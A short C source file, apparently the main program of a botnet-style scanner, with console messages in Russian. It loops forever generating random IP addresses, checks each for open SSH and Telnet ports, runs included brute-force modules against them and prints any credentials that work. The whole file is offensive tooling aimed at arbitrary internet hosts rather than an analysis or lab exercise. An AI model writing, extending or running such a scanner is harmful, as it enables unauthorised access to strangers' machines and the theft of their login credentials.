#include "bruteforce/ssh_bruteforce.c"
#include "bruteforce/telnet_bruteforce.c"
#include "include/includes.h"

int main (){
    char ip_address[IP_ADDRESS_LENGTH];
    while (1) {
        generate_random_ip(ip_address, IP_ADDRESS_LENGTH);
        printf("Проверка IP: %s", ip_address);

        usleep(100000);

        //
        if (check_port_open_on_ip(ip_address, SSH_PORT) == 1) {
            Credentials ssh_credentials = ssh_brute(ip_address);
            if (ssh_credentials.good) {printf("Успешный вход: %s:%s\n", ssh_credentials.username, ssh_credentials.password);}
            else {printf("Не удалось войти на %s\n", SSH_HOST);}
        }

        if (check_port_open_on_ip(ip_address, TELNET_PORT) == 1) {
            Credentials telnet_credentials = telnet_brute(ip_address);
            if (telnet_credentials.good) {printf("Успешный вход: %s:%s\n", telnet_credentials.username, telnet_credentials.password);}
            else {printf("Не удалось войти на %s\n", TELNET_HOST);}
        }
        //
    }

    return 0;
}